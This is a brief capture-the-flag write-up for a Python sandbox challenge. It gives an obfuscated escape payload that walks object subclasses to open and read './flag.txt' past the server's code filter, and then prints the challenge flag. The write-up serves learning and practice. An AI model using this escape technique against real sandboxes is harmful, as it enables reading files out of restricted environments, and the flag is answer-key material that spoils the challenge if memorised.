The server filters almost all python code, but it is simply a matter of obfuscation to get it to print the flag. One method is `file("./flag.txt").read()`, which translates to `().__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read()`.
flag: `not_your_average_python`
